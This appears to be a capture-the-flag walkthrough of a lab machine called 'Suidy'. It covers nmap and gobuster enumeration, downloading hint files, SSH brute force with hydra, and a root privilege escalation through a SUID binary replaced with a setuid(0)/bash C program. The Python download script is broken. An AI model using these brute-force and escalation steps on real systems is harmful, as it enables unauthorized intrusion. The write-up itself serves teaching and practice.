root@kali ~# nmap -sS -A -T4 -p- 10.0.0.17

22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)                                       
| ssh-hostkey:                                                                                            
|   2048 8a:cb:7e:8a:72:82:84:9a:11:43:61:15:c1:e6:32:0b (RSA)                                            
|   256 7a:0e:b6:dd:8f:ee:a7:70:d9:b1:b5:6e:44:8f:c0:49 (ECDSA)                                           
|_  256 80:18:e6:c7:01:0e:c6:6d:7d:f4:d2:9f:c9:d0:6f:4c (ED25519)                                         
80/tcp open  http    nginx 1.14.2                                                                         
|_http-title: Site doesn't have a title (text/html).                                                      
|_http-server-header: nginx/1.14.2 

nmap find 2 open ports, let's start enumuerating HTTP. 

root@kali ~# gobuster dir -u http://10.0.0.17 -w /usr/share/wordlists/dirb/common.txt

/index.html           (Status: 200) [Size: 22]
/robots.txt           (Status: 200) [Size: 362]

Going to robots.txt we get this message.

robots.txt:
/hi /....\..\.-\--.\.-\..\-. shehatesme
I didn't understand what was the meaning of the wired string so I searched similar patterns online and found out is was a "Morse" code.

Morse decode ---> H I A G A I N

Not very helpful but we have more information in the message, if we go to /shehatesme we get another message:

She hates me because I FOUND THE REAL SECRET! I put in this directory a lot of .txt files. ONE of .txt files contains credentials like "theuser/thepass" to access to her system! All that you need is an small dict from Seclist! 

I downloaded the tool "seclists" from https://github.com/danielmiessler/SecLists and after using the wordlist /seclists/Miscellaneous/lang-english.txt I found those text files:

about.txt            
admin.txt            
airport.txt          
alba.txt             
art.txt              
blog.txt             
es.txt               
folder.txt           
forums.txt           
full.txt             
guide.txt            
issues.txt           
java.txt             
jobs.txt             
link.txt             
network.txt          
new.txt              
other.txt            
page.txt             
privacy.txt          
search.txt           
secret.txt           
space.txt            
welcome.txt          
wha.txt              
cymru.txt            
google.txt

Since the message says there are usernames and passwords in the files we need download and read them, let's use python for that.

[
	import requests
	import urllib
	
	URL = "http://10.0.0.17/shehatesme"
	
	with open ("./foundFiles.txt","r") as file:
	    lines = file.readlines()
	    for index in range(len(lines)):
	        fileName = lines[index].rstrip()
	        req = requests.post((URL + "/" + fileName) ,allow_redirects=True)
        urllib.request.urlretrieve(urlWithFiles, "Files/"+fileName)
]

Found crediantles:

hidden1/passZZ!
jaime11/JKiufg6
jhfbvgt/iugbnvh
john765/FDrhguy
maria11/jhfgyRf
mmnnbbv/iughtyr
nhvjguy/kjhgyut
yuijhse/hjupnkk

I divided the users and passwords to separte files.

root@kali ~/D/C/S/Files# cat * | sort | uniq | cut -d '/' -f1
hidden1
jaime11
jhfbvgt
john765
maria11
mmnnbbv
nhvjguy
yuijhse

root@kali ~/D/C/S/Files# cat * | sort | uniq | cut -d '/' -f2
passZZ!
JKiufg6
iugbnvh
FDrhguy
jhfgyRf
iughtyr
kjhgyut
hjupnkk

root@kali ~/D/C/Suidy [SIGINT]# hydra -L users.txt -P passwords.txt ssh://10.0.0.17 -I -t4

Suprisangly none of the creds we found were valid, it was the "theuser:thepass".
(一_一)

After loggin in we can find the first flag.

theuser@suidy:~$ cat user.txt 
HMV2353IVI

theuser@suidy:/home/suidy$ ls -l
total 8
-r--r----- 1 suidy suidy   197 sep 26  2020 note.txt
-rwsrwsr-x 1 root  theuser 246 ene 31 21:32 suidyyyyy

There is another home folder named suidy, it holds a note and an a file with SUID permissions of root named suidyyyyy.

note.txt:
I love SUID files!
The best file is suidyyyyy because users can use it to feel as I feel.
root know it and run an script to be sure that my file has SUID. 
If you are "theuser" I hate you!

-suidy

The note says that there is a program on /root that checks if the program "suidyyyyy" is SUID, we can upload pspy64s to the machine and see what happens. The machine doesn't allow to download files from github so I downloaded the file to my local machine and downloaded it from there.

crontab:
2022/01/30 22:46:01 CMD: UID=0    PID=1937   | /bin/sh -c sh /root/timer.sh 
2022/01/30 22:46:01 CMD: UID=0    PID=1938   | sh /root/timer.sh 

2022/01/31 01:33:48 CMD: UID=1001 PID=2815   | sh -c /bin/bash 
2022/01/31 01:33:48 CMD: UID=1001 PID=2816   | /bin/bash 

If we runn ./suidyyyyy we switche to "suidy" user.
Because the /root/timer.sh program allows suidyyyyy to be run with SUID permissions we can move another a C program that gives our user the uid and gid of the root user and a shell.

[
	#include <stdio.h>
	#include <sys/types.h>
	#include <unistd.h>
	#include <stdlib.h>
	
	int main(void)
	{
		setuid(0);
		setgid(0);
		system("/bin/bash");
	}
]

root@suidy:~# cat user.txt 
HMV2353IVI